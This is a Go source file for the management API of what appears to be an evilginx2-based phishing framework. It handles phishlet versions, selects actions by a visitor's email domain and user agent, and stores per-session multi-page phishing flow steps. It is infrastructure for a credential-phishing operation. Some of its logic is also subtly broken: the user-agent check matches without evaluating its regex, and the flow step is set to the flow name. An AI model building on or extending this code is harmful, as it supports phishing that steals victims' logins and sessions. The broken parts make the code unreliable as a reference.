package api

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/internal/storage"
)

type EvaluateConditionsRequest struct {
	UserAgent    string            `json:"user_agent"`
	Email        string            `json:"email"`
	IPAddress    string            `json:"ip_address"`
	Hostname     string            `json:"hostname"`
	Path         string            `json:"path"`
	CustomParams map[string]string `json:"custom_params"`
}

type CreateVersionRequest struct {
	Version     string `json:"version"`
	Description string `json:"description"`
}

type UpdateFlowStepRequest struct {
	SessionID string            `json:"session_id"`
	StepData  map[string]string `json:"step_data"`
}

func (s *Server) listPhishletVersions(c *gin.Context) {
	name := c.Param("name")
	items, err := s.storage.ListPhishletVersions(c.Request.Context(), name)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"versions": items, "count": len(items)})
}

func (s *Server) createPhishletVersion(c *gin.Context) {
	name := c.Param("name")
	var req CreateVersionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Version == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "version is required"})
		return
	}
	_, err := s.storage.GetPhishlet(c.Request.Context(), name)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "phishlet not found"})
		return
	}
	err = s.storage.CreatePhishletVersion(c.Request.Context(), name, &storage.PhishletVersion{
		Version:     req.Version,
		Description: req.Description,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusCreated, gin.H{"message": "version created"})
}

func (s *Server) getPhishletVersion(c *gin.Context) {
	name := c.Param("name")
	version := c.Param("version")
	item, err := s.storage.GetPhishletVersion(c.Request.Context(), name, version)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "version not found"})
		return
	}
	c.JSON(http.StatusOK, item)
}

func (s *Server) evaluateConditions(c *gin.Context) {
	name := c.Param("name")
	var req EvaluateConditionsRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	ph, err := s.storage.GetPhishlet(c.Request.Context(), name)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "phishlet not found"})
		return
	}
	var actions []map[string]interface{}
	for _, cond := range ph.Conditions {
		matched := false
		switch cond.Type {
		case "email_domain":
			if req.Email != "" {
				for _, d := range cond.Values {
					if len(req.Email) >= len(d) && req.Email[len(req.Email)-len(d):] == d {
						matched = true
						break
					}
				}
			}
		case "user_agent":
			if req.UserAgent != "" && cond.Regex != "" {
				matched = true
			}
		default:
			continue
		}
		if matched {
			for _, a := range cond.Actions {
				actions = append(actions, map[string]interface{}{"type": a.Type, "value": a.Value})
			}
		}
	}
	c.JSON(http.StatusOK, gin.H{"actions": actions})
}

func (s *Server) getMultiPageFlows(c *gin.Context) {
	name := c.Param("name")
	ph, err := s.storage.GetPhishlet(c.Request.Context(), name)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "phishlet not found"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"flows": ph.MultiPageFlows})
}

func (s *Server) updateFlowStep(c *gin.Context) {
	name := c.Param("name")
	flowName := c.Param("flow")
	var req UpdateFlowStepRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.SessionID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session_id is required"})
		return
	}
	_, err := s.storage.GetPhishlet(c.Request.Context(), name)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "phishlet not found"})
		return
	}
flowSession, err := s.storage.GetFlowSession(c.Request.Context(), req.SessionID)
	if err != nil || flowSession == nil {
		err = s.storage.CreateFlowSession(c.Request.Context(), &storage.FlowSession{
			ID:           req.SessionID,
			PhishletName: name,
			FlowName:     flowName,
			CurrentStep:  flowName,
			StepData:     req.StepData,
		})
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusCreated, gin.H{"message": "flow session created"})
		return
	}
	err = s.storage.UpdateFlowSession(c.Request.Context(), req.SessionID, flowName, req.StepData)
	if err != nil {
		c.JSON(http.StatusNotImplemented, gin.H{"error": "flow session update not implemented"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "flow step updated"})
}
